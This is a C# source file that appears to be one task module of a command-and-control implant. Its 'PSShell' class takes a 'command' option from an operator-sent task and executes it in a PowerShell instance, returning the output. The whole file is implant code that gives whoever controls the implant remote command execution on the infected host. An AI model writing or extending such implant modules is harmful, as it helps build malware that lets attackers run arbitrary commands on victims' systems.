using Implant.Models;
using Implant.Utils;

namespace Implant.Tasks.Execute
{
    class PSShell : ImplantCommands
    {
        private string Command { get; set; }
        private string Args { get; set; }

        public override string Name => "PSShell";
        public override string Execute(ImplantTask task)
        {
            var opts = ImplantOptionUtils.ReturnMethod(task);
            Args = task.Args.Replace("\\", "");
            var args = ImplantOptionUtils.ParseArgs(Args);

            foreach (var opt in opts)
            {
                foreach (var _params in args.Params)
                {
                    if ((_params.OptionName.ToLower() is "command")
                        && (_params.OptionName.ToLower() == opt.GetPropertyValue("Name").ToString().ToLower()))
                    {
                        Command = _params.OptionValue;
                    }
                }
            }

            var ps = PSShellFunctions.CreateInstance();
            return PSShellFunctions.Execute(ps, Command).Trim('\n');
        }    }
}
